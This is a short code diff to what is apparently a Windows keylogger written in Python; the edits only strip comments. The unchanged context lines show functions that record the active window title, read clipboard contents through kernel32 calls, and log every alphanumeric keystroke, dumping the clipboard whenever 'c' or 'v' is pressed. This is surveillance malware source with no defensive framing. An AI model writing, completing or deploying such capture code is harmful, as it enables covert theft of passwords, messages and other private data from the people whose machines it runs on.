@@ -20,7 +20,7 @@ def get_current_window(): # Function to grab the current window and its title
     
     GetWindowText(hwnd, buff, length + 1) # Get window title and store in buff
 
-    return buff.value # Return the value of buff
+    return buff.value 
 
 def get_clipboard():
     
@@ -46,7 +46,7 @@ def get_clipboard():
             data_locked = kernel32.GlobalLock(data) # Get pointer to memory location where the data is located
             text = ctypes.c_char_p(data_locked) # Get a char * pointer (string in Python) to the location of data_locked
             value = text.value # Dump the content in value
-            kernel32.GlobalUnlock(data_locked) # Decrement de lock count
+            kernel32.GlobalUnlock(data_locked)
             return value.decode('utf-8') # Return the clipboard content
     finally:
         CloseClipboard() # Close the clipboard
@@ -77,5 +77,5 @@ def get_keystrokes(log_dir, log_name): # Function to monitor and log keystrokes
                 elif i == 0x63 or i == 0x43 or i == 0x56 or i == 0x76: # If characters 'c' or 'C' are pressed, get clipboard data
                     clipboard_data = get_clipboard()
                     logging.info("[CLIPBOARD] {}".format(clipboard_data))
-                elif 0x30 <= i <= 0x5a: # If alphanumeric character, append to line
+                elif 0x30 <= i <= 0x5a: 
                     line.append(chr(i))
